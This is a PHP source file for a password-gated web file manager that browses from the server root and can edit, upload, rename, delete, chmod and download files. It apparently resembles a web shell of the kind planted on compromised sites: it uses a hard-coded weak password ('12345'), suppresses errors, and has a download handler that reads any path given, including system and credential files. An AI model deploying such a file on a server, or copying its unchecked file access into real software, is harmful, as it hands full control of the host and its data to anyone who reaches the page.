<?php
error_reporting(0);
session_start();

/* 🔥 LOGIN ACCESS (ADDED WITHOUT TOUCHING YOUR CODE) */
$PASSWORD = "12345"; // ← change your password

if (!isset($_SESSION['logged_in'])) {

    if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
        $_SESSION['logged_in'] = true;
        header("Location: ?");
        exit;
    }

    ?>
    <form method="post" style="margin:auto;margin-top:100px;width:300px;padding:20px;border:1px solid #aaa;font-family:Arial;">
        <h3>🔐 Secure Login</h3>
        <input type="password" name="pass" placeholder="Enter Password" style="width:100%;padding:8px;">
        <button style="margin-top:15px;padding:8px 12px;">Login</button>
    </form>
    <?php
    exit;
}

/* LOGOUT OPTION */
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

/* SAFE PATH */
function safe_path($path) {
    if (!$path) return "/";
    $real = realpath($path);
    return ($real && is_dir($real)) ? $real : "/";
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : "/";
$path = safe_path($dir);

/* DELETE */
if (isset($_GET['delete'])) {
    $del = $path . "/" . basename($_GET['delete']);
    if (is_file($del)) unlink($del);
    if (is_dir($del)) rmdir($del);
    header("Location: ?dir=" . urlencode($path));
    exit;
}

/* RENAME */
if (isset($_POST['action']) && $_POST['action'] === "rename") {
    $old = $path . "/" . basename($_POST['old']);
    $new = $path . "/" . basename($_POST['new']);
    if (file_exists($old)) rename($old, $new);
    header("Location: ?dir=" . urlencode($path));
    exit;
}

/* SAVE EDIT FILE */
if (isset($_POST['action']) && $_POST['action'] === "savefile") {
    $file = $path . "/" . basename($_POST['filename']);
    file_put_contents($file, $_POST['content']);
    header("Location: ?dir=" . urlencode($path));
    exit;
}

/* 🎯 FILE UPLOAD */
if (isset($_POST['action']) && $_POST['action'] === "upload") {
    if (!empty($_FILES['file']['name'])) {
        $target = $path . "/" . basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $target);
    }
    header("Location: ?dir=" . urlencode($path));
    exit;
}

/* 🎯 CHANGE PERMISSIONS (CHMOD) */
if (isset($_POST['action']) && $_POST['action'] === "chmod") {
    $file = $path . "/" . basename($_POST['file']);
    $perm = intval($_POST['perm'], 8);
    chmod($file, $perm);
    header("Location: ?dir=" . urlencode($path));
    exit;
}

/* EDIT PAGE */
if (isset($_GET['edit'])) {
    $f = $path . "/" . basename($_GET['edit']);
    $content = htmlspecialchars(file_get_contents($f));
    $name = basename($f);
?>
<!DOCTYPE html>
<html>
<head>
<title>Edit <?= $name ?></title>
<style>
body{font-family:Arial;padding:20px;}
textarea{width:100%;height:500px;font-family:monospace;}
</style>
</head>
<body>
<h3>Editing: <?= $name ?></h3>
<form method="post">
<input type="hidden" name="action" value="savefile">
<input type="hidden" name="filename" value="<?= $name ?>">
<textarea name="content"><?= $content ?></textarea><br><br>
<button>Save</button>
<a href="?dir=<?= urlencode($path) ?>">Cancel</a>
</form>
</body>
</html>
<?php exit; }

/* DOWNLOAD */
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    header("Content-Type: application/octet-stream");
    header("Content-Disposition: attachment; filename=" . basename($file));
    readfile($file);
    exit;
}

$items = scandir($path);
?>
<!DOCTYPE html>
<html>
<head>
<title>Simple File Manager</title>
<style>
body{font-family:Arial;padding:20px;}
table{width:100%;border-collapse:collapse;margin-top:15px;}
td,th{padding:8px;border-bottom:1px solid #ccc;}
a{text-decoration:none;}
.popup{
    position:fixed;top:30%;left:50%;transform:translate(-50%,-50%);
    background:#fff;border:1px solid #aaa;padding:20px;width:300px;
    display:none;
}
.popup input{width:100%;padding:6px;margin-top:10px;}
</style>
</head>
<body>

<h2>📁 Simple File Manager</h2>

<p><a href="?logout=1">Logout</a></p>

<!-- UPLOAD MODULE -->
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="action" value="upload">
    <input type="file" name="file">
    <button>Upload</button>
</form>
<br>

<!-- BREADCRUMB -->
<p><strong>Path:</strong> 
<?php
$crumb = "";
$parts = explode("/", trim($path, "/"));
echo '<a href="?dir=/">/</a>';
foreach ($parts as $p) {
    if (!$p) continue;
    $crumb .= "/" . $p;
    echo ' / <a href="?dir='.urlencode($crumb).'">'.$p.'</a>';
}
?>
</p>

<!-- BACK BUTTON -->
<?php if ($path != "/"): ?>
<?php $parent = dirname($path); ?>
<a href="?dir=<?= urlencode($parent) ?>">⬅ Back</a>
<?php endif; ?>
<br><br>

<table>
<tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>

<?php foreach ($items as $item): ?>
<?php if ($item=="." || $item=="..") continue; ?>
<?php $full=$path."/".$item; $isDir=is_dir($full); ?>
<?php $perm = substr(sprintf('%o', fileperms($full)), -3); ?>

<tr>
<td>
<?php if ($isDir): ?>
📁 <a href="?dir=<?= urlencode($full) ?>"><?= $item ?></a>
<?php else: ?>
📄 <?= $item ?>
<?php endif; ?>
</td>

<td><?= $isDir?"Folder":"File" ?></td>
<td><?= $isDir?"-":filesize($full)." bytes" ?></td>

<td>

<?php if (!$isDir): ?>
<a href="?edit=<?= urlencode($item) ?>&dir=<?= urlencode($path) ?>">Edit</a> |
<a href="?download=<?= urlencode($full) ?>">Download</a> |
<?php endif; ?>

<!-- RENAME -->
<a href="#" onclick="openRename('<?= $item ?>')">Rename</a> |

<!-- CHMOD BUTTON -->
<a href="#" onclick="openChmod('<?= $item ?>','<?= $perm ?>')">Chmod</a> |

<!-- DELETE -->
<a style="color:red" onclick="return confirm('Delete?')" href="?dir=<?= urlencode($path) ?>&delete=<?= urlencode($item) ?>">Delete</a>
</td>
</tr>
<?php endforeach; ?>

</table>

<!-- RENAME POPUP -->
<div id="renameBox" class="popup">
<h3>Rename</h3>
<form method="post">
<input type="hidden" name="action" value="rename">
<input type="hidden" name="old" id="oldName">
New Name:
<input type="text" name="new" id="newName">
<br><br>
<button>Save</button>
<button type="button" onclick="closeRename()">Cancel</button>
</form>
</div>

<!-- CHMOD POPUP -->
<div id="chmodBox" class="popup">
<h3>Change Permission</h3>
<form method="post">
<input type="hidden" name="action" value="chmod">
<input type="hidden" name="file" id="chmodFile">
Permission (e.g., 644, 755, 777):
<input type="text" name="perm" id="chmodPerm">
<br><br>
<button>Save</button>
<button type="button" onclick="closeChmod()">Cancel</button>
</form>
</div>

<script>
function openRename(name){
    renameBox.style.display="block";
    oldName.value=name;
    newName.value=name;
}
function closeRename(){
    renameBox.style.display="none";
}

function openChmod(file, perm){
    chmodBox.style.display="block";
    chmodFile.value=file;
    chmodPerm.value=perm;
}
function closeChmod(){
    chmodBox.style.display="none";
}
</script>

</body>
</html>
